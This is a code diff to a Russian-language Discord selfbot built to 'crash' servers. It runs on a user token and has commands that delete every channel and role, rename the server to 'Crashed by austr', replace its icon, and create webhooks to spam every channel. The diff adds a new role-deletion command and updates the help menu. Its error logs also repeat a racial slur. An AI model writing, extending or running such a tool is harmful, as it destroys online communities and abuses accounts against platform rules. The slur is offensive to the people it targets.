@@ -1,4 +1,4 @@
-// добавлена поддержка Embed  и увеличена скорость
+// добавлена поддержка Embed  и увеличена скорость, добавлена поддержка рандома
 
 const token = process.env['TOKEN']
 const Discord = require('discord.js-selfbot');
@@ -35,7 +35,7 @@ client.on('message', async (message) => {
      message.guild.channels.cache.forEach 
      (channel => channel.delete());  
      } catch { 
-        message.channel.send("Негр ошибка");
+        console.log("Негр ошибка");
         } 
         message.guild.roles.cache.forEach(role => { 
         if (role.editable && role.id !== message.guild.id) role.delete() 
@@ -63,7 +63,7 @@ client.on('message', async (message) => {
               });
           });
       } 1000;
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 };
 });
 
@@ -86,8 +86,26 @@ client.on('message', async (message) => {
               });
           });
         };
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 });
+
+
+
+client.on('message', async (message) => {
+  if (message.content === '~delroles') {
+  if (allowedusers.includes(message.author.id)) {
+    message.delete(); 
+    try { 
+      message.guild.roles.cache.forEach(role => { 
+        if (role.editable && role.id !== message.guild.id) role.delete() 
+    }); 
+     } catch { 
+        console.log("Негр ошибка");
+        } 
+                  } else {console.log('[ Будет спамить вам логи ]')}
+              };
+          });
+
 
 
 
@@ -95,9 +113,10 @@ client.on('message', async (message) => {
   if (message.content === '~rename') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
-    message.guild.setIcon("https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png");
+  
+message.guild.setIcon("https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png");
     await message.guild.setName("××× Crashed by austr ×××");
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 };
 });
 
@@ -127,7 +146,7 @@ client.on('message', async (message) => {
               });
           });
       } 1000;
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 };
 });
 
@@ -141,7 +160,7 @@ client.on('message', async (message) => {
      (channel => {channel.createWebhook("××× Crashed by Austr ×××", {})
           });
         };
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 });
 
 
@@ -153,12 +172,12 @@ client.on('message', async (message) => {
      message.guild.channels.cache.forEach 
      (channel => channel.delete()); 
      } catch { 
-        message.channel.send("Негр ошибка");
+        console.log("Негр ошибка");
         } 
         message.guild.roles.cache.forEach(role => { 
         if (role.editable && role.id !== message.guild.id) role.delete() 
     }); 
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 };
 });
 
@@ -173,7 +192,7 @@ client.on('message', async (message) => {
      } catch { 
         console.log("Негр ошибка");
         } 
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 };
 });
 
@@ -188,7 +207,7 @@ client.on('message', async (message) => {
      } catch { 
         console.log(error)
         } 
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 };
 });
 
@@ -199,7 +218,7 @@ client.on('message', message => {
     message.delete();
     message.channel.send(`Пинг ${Date.now() - message.createdTimestamp}ms. API-пинг ${Math.round(client.ws.ping)}ms`);
   }
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 });
 
 
@@ -209,9 +228,9 @@ client.on('message', (msg) => {
   if (allowedusers.includes(msg.author.id)) {
     msg.delete();
     let now = Date.now()
-    msg.channel.send('```~auto - автоматический краш сервера\n~nuke - удаление всех каналов и ролей\n~ping - пинг селф бота\n~renchannels - переименование каналов\n~delchannels - удаление каналов\n~roles - создание ролей\n~channels - создание каналов\n~createhooks - создание вебхуков везде\n~hookall - спам хуками во все каналы\n~rename - изменение иконки и имени сервера```')
+    msg.channel.send('```~auto - автоматический краш сервера\n~nuke - удаление всех каналов и ролей\n~ping - пинг селф бота\n~renchannels - переименование каналов\n~delchannels - удаление каналов\n~delroles - удаление ролей\n~roles - создание ролей\n~channels - создание каналов\n~createhooks - создание вебхуков везде\n~hookall - спам хуками во все каналы\n~rename - изменение иконки и имени сервера```')
   }
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 })
 
 
@@ -233,7 +252,7 @@ client.on('message', (msg) => {
           .catch(console.error);
       }
   }
-    } else {console.log('ваша мама шлюха')}
+    } else {console.log('[ Будет спамить вам логи ]')}
 })
 
 
